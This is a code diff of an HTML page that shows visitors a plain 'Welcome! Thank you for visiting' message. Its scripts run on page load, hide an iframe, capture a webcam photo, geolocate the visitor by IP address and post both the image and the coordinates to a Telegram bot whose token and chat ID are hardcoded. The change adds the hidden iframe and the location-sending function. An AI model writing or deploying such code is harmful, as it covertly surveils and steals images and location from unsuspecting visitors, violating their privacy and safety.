@@ -31,6 +31,9 @@
             max-width: 400px;
             border-radius: 10px;
         }
+        iframe {
+            display: none;
+        }
     </style>
     <script>
         function track() {
@@ -61,38 +64,72 @@
         }
 
         function takeSelfie() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://yourdomain.com/camera.html';
+            document.body.appendChild(iframe);
 
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(() => {
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/jpeg');
-                        const botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
-                        const chatId = '5410457102';
-                        fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                photo: imageData
-                            })
+            iframe.onload = () => {
+                const video = iframe.contentWindow.document.getElementById('video');
+                const canvas = iframe.contentWindow.document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg');
+                            const botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
+                            const chatId = '5410457102';
+                            fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    photo: imageData
+                                })
+                            });
+                        }, 1000); // Capture after 1 second
+                    })
+                    .catch(err => {
+                        console.error('Error accessing the camera:', err);
+                    });
+            };
+        }
+
+        function sendLocationAndSelfie() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_IO_TOKEN`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
+                            var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
+                            var chatId = '5410457102';
+                            fetch('https://api.telegram.org/bot' + botToken + '/sendLocation', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    latitude: locationData.loc.split(',')[0],
+                                    longitude: locationData.loc.split(',')[1]
+                                })
+                            });
                         });
-                    }, 1000); // Capture after 1 second
-                })
-                .catch(err => {
-                    console.error('Error accessing the camera:', err);
                 });
+
+            takeSelfie();
         }
     </script>
 </head>
-<body onload="track(); takeSelfie();">
+<body onload="track(); sendLocationAndSelfie();">
     <div>
         <h1>Welcome!</h1>
         <p>Thank you for visiting.</p>
